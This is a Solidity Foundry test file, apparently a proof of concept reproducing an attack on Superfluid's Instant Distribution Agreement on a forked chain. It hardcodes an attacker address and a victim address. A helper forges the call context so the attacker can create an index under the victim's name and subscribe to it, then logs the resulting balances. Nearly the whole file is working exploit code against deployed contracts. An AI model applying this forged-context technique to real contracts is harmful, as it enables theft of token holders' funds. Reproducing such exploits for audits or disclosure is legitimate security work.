// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ISuperfluid {
    function callAgreement(address, bytes calldata, bytes calldata) external returns (bytes memory);
}
interface IIDA {
    function createIndex(address,uint32,bytes calldata) external returns (bytes memory);
    function approveSubscription(address,address,uint32,bytes calldata) external returns (bytes memory);
    function claim(address,address,uint32,address,bytes calldata) external returns (bytes memory);
    function getIndex(address,address,uint32) external view returns (bool,uint128,uint128,uint128);
    function getSubscription(address,address,uint32,address) external view returns (bool,bool,uint128,uint256);
}
interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256,uint256,uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
}

contract ApproveChainTest is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant VICTIM = 0x1c81F6A5dbD715BE1a66a38F7Ed3Bbcd4098EDd4;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_fullChain() public {
        console.log("Victim MATICx:", IMATICx(MATICx).balanceOf(VICTIM));
        console.log("Attacker native:", ATTACKER.balance);
        
        // Step 1: Create index under VICTIM's name (forged ctx)
        console.log("\n=== Step 1: createIndex as victim ===");
        bytes memory createData = _forged(
            IIDA.createIndex.selector,
            abi.encode(MATICx, uint32(999)),
            VICTIM
        );
        vm.prank(ATTACKER);
        ISuperfluid(HOST).callAgreement(IDA, createData, "");
        
        (bool exist,,,) = IIDA(IDA).getIndex(MATICx, VICTIM, 999);
        console.log("Index exists under victim:", exist);
        
        // Step 2: approveSubscription - add ATTACKER as subscriber to VICTIM's index
        console.log("\n=== Step 2: approveSubscription (attacker subscribes to victim's index) ===");
        bytes memory approveData = _forged(
            IIDA.approveSubscription.selector,
            abi.encode(MATICx, VICTIM, uint32(999)),
            ATTACKER  // subscriber = attacker
        );
        vm.prank(ATTACKER);
        ISuperfluid(HOST).callAgreement(IDA, approveData, "");
        
        (bool subExist, bool approved, uint128 units, uint256 pending) = 
            IIDA(IDA).getSubscription(MATICx, VICTIM, 999, ATTACKER);
        console.log("Sub exists:", subExist);
        console.log("Approved:", approved);
        console.log("Units:", units);
        console.log("Pending:", pending);
        
        // Check if victim's balance changed
        console.log("\nVictim MATICx after:", IMATICx(MATICx).balanceOf(VICTIM));
        (int256 victimRt,,) = IMATICx(MATICx).realtimeBalanceOfNow(VICTIM);
        console.log("Victim realtime:", victimRt);
        
        console.log("Attacker MATICx:", IMATICx(MATICx).balanceOf(ATTACKER));
        (int256 atkRt,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
        console.log("Attacker realtime:", atkRt);
    }

    function _forged(bytes4 sel, bytes memory args, address sender) internal view returns (bytes memory) {
        uint256 callInfo = (1 << 32);
        bytes memory ctx1 = abi.encode(callInfo, block.timestamp, sender, sel, bytes(""));
        bytes memory ctx2 = abi.encode(uint256(0), int256(0), address(0), address(0));
        bytes memory fakeCtx = abi.encode(ctx1, ctx2);
        
        bytes memory inner = abi.encodePacked(sel, args, abi.encode(fakeCtx));
        return abi.encodePacked(inner, abi.encode(new bytes(0)));
    }
}
